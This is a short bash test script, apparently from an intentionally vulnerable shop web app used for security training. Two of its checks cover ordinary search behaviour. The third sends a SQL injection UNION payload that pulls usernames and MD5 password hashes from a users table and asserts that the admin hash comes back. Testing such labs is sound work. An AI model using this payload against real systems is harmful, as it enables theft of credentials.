#!/usr/bin/env bash
set -u
cd "$(dirname "$0")/.." || exit 1
source tests/lib.sh

# (a) búsqueda normal encuentra el producto demo
assert_contains "$(curl -s "$BASE/tienda/search.php?q=Camiseta")" "Camiseta Demo" "search término normal"

# (b) Review Focus #3: término sin resultados -> 200, sin 500
code=$(curl -s -o /dev/null -w '%{http_code}' "$BASE/tienda/search.php?q=zzz_no_existe")
[ "$code" = "200" ] || fail "search sin resultados responde 200"

# (c) SQLi UNION revela usuario y su hash MD5
payload="' UNION SELECT id, username, password_md5, NULL FROM users -- -"
out=$(curl -s -G "$BASE/tienda/search.php" --data-urlencode "q=$payload")
exphash=$(printf '%s' 'letmein' | md5sum | cut -d' ' -f1)
assert_contains "$out" "admin" "UNION revela username admin"
assert_contains "$out" "$exphash" "UNION revela hash MD5 de admin"

echo "02_sqli_union OK"
